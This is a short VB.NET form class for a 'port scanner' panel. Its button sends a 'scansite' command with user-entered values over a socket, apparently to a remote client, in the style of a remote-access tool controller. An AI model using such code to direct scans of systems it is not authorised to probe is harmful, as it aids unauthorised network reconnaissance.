Public Class portscanner
    Public sock As Integer
    Public jj As Integer = 0

    Private Sub SkyDarkButton1_Click(sender As System.Object, e As System.EventArgs) Handles SkyDarkButton1.Click
        ListView1.Items.Clear()
        Main.S.Send(sock, "scansite" & Main.Yy & TextBox1.Text & Main.Yy & TextBox2.Text & Main.Yy & TextBox3.Text)
    End Sub
End Class